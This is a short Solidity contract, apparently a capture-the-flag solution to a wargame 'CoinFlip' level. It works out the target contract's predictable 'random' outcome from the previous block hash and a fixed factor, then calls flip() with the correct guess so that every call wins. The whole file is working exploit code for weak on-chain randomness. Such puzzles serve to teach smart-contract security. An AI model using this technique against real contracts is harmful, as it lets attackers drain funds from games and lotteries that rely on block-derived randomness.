pragma solidity ^0.4.18;

import "./levels/CoinFlip.sol";

contract CoinFlipHack {
  uint256 lastHash;
  uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() public {}

  function attack(address instance) public {
    
    uint256 blockValue = uint256(blockhash(block.number-1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    CoinFlip(instance).flip(side);
  }
}